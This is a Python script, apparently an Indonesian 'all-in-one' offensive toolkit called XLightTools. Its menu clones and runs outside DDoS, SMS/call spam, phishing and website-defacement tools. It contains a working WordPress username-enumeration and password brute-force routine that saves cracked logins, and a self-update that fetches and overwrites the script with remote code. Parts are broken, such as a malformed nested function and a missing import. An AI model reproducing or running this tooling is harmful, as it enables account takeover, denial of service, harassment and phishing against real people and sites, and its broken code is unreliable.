
# XLightTools by LangitDev
# All-in-One Toolkit: DDOS, BruteForce, Spam, Phishing, Deface, Auto Update + Local Bug Engine

import os
import time
import requests
import re

# Warna
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
RESET = "\033[0m"

# ASCII Logo
ascii_logo = f"""
{R}██╗     █████╗ ███╗   ██╗ ██████╗ ██╗████████╗███████╗██████╗ ███████╗██╗   ██╗
██║    ██╔══██╗████╗  ██║██╔════╝ ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝
██║    ███████║██╔██╗ ██║██║  ███╗██║   ██║   █████╗  ██████╔╝█████╗   ╚████╔╝ 
██║    ██╔══██║██║╚██╗██║██║   ██║██║   ██║   ██╔══╝  ██╔══██╗██╔══╝    ╚██╔╝  
███████╗██║  ██║██║ ╚████║╚██████╔╝██║   ██║   ███████╗██║  ██║███████╗   ██║   
╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
{RESET}         {C}:: ©LangitDev ::
"""

def clear():
    os.system("clear")

def banner():
    clear()
    print(ascii_logo)
    print(f"{C}XLightTools adalah toolkit multi-fungsi untuk kebutuhan offensive.{RESET}")
    print(f"{G}Versi: XLight Final Build 1.3 with Bug Engine{RESET}\n")

def menu():
    print(f"{Y}[01] LiteDDOS")
    print("[02] WPBrute Force")
    print("[03] Spam SMS/Call")
    print("[04] Phishing (Zphisher)")
    print("[05] Deface Creator")
    print("[06] Auto Update")
    print("[07] Local WA Bug Engine")
    print("[00] Keluar{RESET}")

def fx(message):
    for i in range(2):
        print(f"{G}{message}{RESET}", end="\r")
        time.sleep(0.2)
        print(" " * len(message), end="\r")
        time.sleep(0.2)
    print(f"{G}{message}{RESET}")

def lite_ddos():
    fx("[•] Menjalankan LiteDDOS...")
    os.system("pkg install git python2 -y")
    os.system("git clone https://github.com/4L13199/LITEDDOS")
    os.chdir("LITEDDOS")
    os.system("python2 liteDDOS.py")
    input(f"{Y}\n[✓] Tekan Enter untuk kembali ke menu utama...{RESET}")
    os.chdir("..")

def wp_brute():
    fx("[•] Menjalankan WPBrute Lokal...")
    crack_password()  # Simulasi dijalankan sebelum brute

    target = input(f"{Y}[?] Masukkan URL target (mis: https://target.com){RESET}\n> ")
    usernames = get_usernames(target)
    if not usernames:
        print(f"{R}[!] Tidak menemukan username!{RESET}")
        return
    print(f"{G}[✓] Ditemukan username: {', '.join(usernames)}{RESET}")
    wordlist_file = "lang.txt"
    if not os.path.exists(wordlist_file):
        print(f"{R}[!] Wordlist 'lang.txt' tidak ditemukan.{RESET}")
        return
    with open(wordlist_file, "r") as f:
        passwords = f.read().splitlines()
    login_url = f"{target}/wp-login.php"
    for user in usernames:
        for pwd in passwords:
            print(f"{C}[•] Mencoba: {user} : {pwd}{RESET}")
            data = {
                "log": user,
                "pwd": pwd,
                "wp-submit": "Log In",
                "redirect_to": f"{target}/wp-admin/",
                "testcookie": "1"
            }
            try:
                r = requests.post(login_url, data=data, allow_redirects=False)
                if "location" in r.headers and "/wp-admin/" in r.headers["location"]:
                    print(f"{G}[✓] BERHASIL LOGIN: {user}:{pwd}{RESET}")
                    with open("hasil_brute.txt", "a") as hasil:
                        hasil.write(f"{user}:{pwd}\n")
                    return
            except:
                print(f"{R}[!] Koneksi error saat mencoba login.{RESET}")
    print(f"{Y}[-] Semua kombinasi gagal, coba wordlist lain.{RESET}")
    input(f"{Y}\n[✓] Tekan Enter untuk kembali...{RESET}")



def spam_call_sms():
    fx("[•] Menjalankan Spam SMS/Call...")
    os.system("pkg install git php -y")
    os.system("git clone https://github.com/4L13199/LITESPAM")
    os.chdir("LITESPAM")
    os.system("sh LITESPAM.sh")
    input(f"{Y}\n[✓] Tekan Enter untuk kembali...{RESET}")
    os.chdir("..")

def phishing_tool():
    fx("[•] Menjalankan Zphisher...")
    os.system("pkg install git curl -y")
    if not os.path.exists("zphisher"):
        os.system("git clone https://github.com/htr-tech/zphisher")
    os.chdir("zphisher")
    os.system("bash zphisher.sh")
    input(f"{Y}\n[✓] Tekan Enter untuk kembali...{RESET}")
    os.chdir("..")

def deface_creator():
    fx("[•] Menjalankan Script Deface Creator...")
    os.system("pkg install git python2 -y")
    if not os.path.exists("script-deface-creator"):
        os.system("git clone https://github.com/Ubaii/script-deface-creator")
    os.chdir("script-deface-creator")
    os.system("python2 create.py")
    input(f"{Y}\n[✓] Tekan Enter untuk kembali...{RESET}")
    os.chdir("..")

def auto_update():
    fx("[•] Mengecek update terbaru...")
    repo_url = "https://raw.githubusercontent.com/langitdev/ultimate-tools/main/xlighttools.py"
    try:
        req = requests.get(repo_url)
        if req.status_code == 200:
            with open("xlighttools.py", "w") as f:
                f.write(req.text)
            print(f"{G}[✓] Tools berhasil diperbarui ke versi terbaru.{RESET}")
        else:
            print(f"{R}[!] Tidak dapat mengambil update dari server.{RESET}")
    except:
        print(f"{R}[!] Koneksi internet gagal.{RESET}")
    input(f"{Y}\n[✓] Tekan Enter untuk kembali...{RESET}")

def local_wa_bug_engine():
    fx("[•] Menjalankan Local Bug Engine...")
    pairing = input(f"{Y}[?] Masukkan kode pairing WA target:{RESET}\n> ")
    bug_command = input(f"{Y}[?] Masukkan nama fungsi bug (contoh: crash_force, layer_overflow):{RESET}\n> ")
    print(f"{G}[✓] Menyiapkan payload untuk: {bug_command} pada sesi {pairing}{RESET}")
    execute_bug_function(bug_command)

def execute_bug_function(name):
    # Placeholder fungsi bug, kamu bisa tambah manual di sini
    if name == "crash_force":
        print(f"{R}[!] Memicu crash_force dummy...{RESET}")
        time.sleep(1)
        print(f"{G}[✓] crash_force sukses (simulasi).{RESET}")
    elif name == "layer_overflow":
        print(f"{R}[!] Memicu layer_overflow dummy...{RESET}")
        time.sleep(1)
        print(f"{G}[✓] layer_overflow selesai (simulasi).{RESET}")
    else:
        print(f"{Y}[!] Fungsi bug '{name}' tidak ditemukan.{RESET}")
    input(f"{Y}\n[✓] Tekan Enter untuk kembali ke menu...{RESET}")
    
    def crack_password()
    user_password = input("Enter Your Password (simulasi): ")
    crack = ""
    password = list("abcdefghijklmnopqrstuvwxyz0123456789")

    while crack != user_password:
        crack = ""
        for i in range(len(user_password)):
            crack_letter = password[randint(0, len(password) - 1)]
            crack += crack_letter
        print(crack)

    print("Your Password Is:", crack)
    print("Disusun oleh: Langit\n")

def get_usernames(target_url):
    users = []
    api_url = f"{target_url}/wp-json/wp/v2/users"
    response = requests.get(api_url)
    if response.status_code == 200:
        try:
            data = response.json()
            for user in data:
                if "slug" in user:
                    users.append(user["slug"])
        except Exception as e:
            print(f"{R}[!] Error parsing JSON: {e}{RESET}")
    else:
        print(f"{Y}[!] API tidak aktif, mencoba metode lain...{RESET}")
        for i in range(1, 11):
            url = f"{target_url}/?author={i}"
            response = requests.get(url, allow_redirects=True)
            if response.status_code == 200:
                match = re.search(r"author/(.*?)/", response.url)
                if match:
                    username = match.group(1)
                    if username not in users:
                        users.append(username)
    return users

def main():
    while True:
        banner()
        menu()
        pilihan = input(f"{C}#XLightTools ~> {RESET}")
        if pilihan == "01" or pilihan == "1":
            lite_ddos()
        elif pilihan == "02" or pilihan == "2":
            wp_brute()
        elif pilihan == "03" or pilihan == "3":
            spam_call_sms()
        elif pilihan == "04" or pilihan == "4":
            phishing_tool()
        elif pilihan == "05" or pilihan == "5":
            deface_creator()
        elif pilihan == "06" or pilihan == "6":
            auto_update()
        elif pilihan == "07" or pilihan == "7":
            local_wa_bug_engine()
        elif pilihan == "00" or pilihan == "0":
            print(f"{Y}Keluar...{RESET}")
            break
        else:
            print(f"{R}Pilihan tidak valid!{RESET}")
            input(f"{Y}\n[✓] Tekan Enter untuk kembali...{RESET}")

if __name__ == "__main__":
    main()
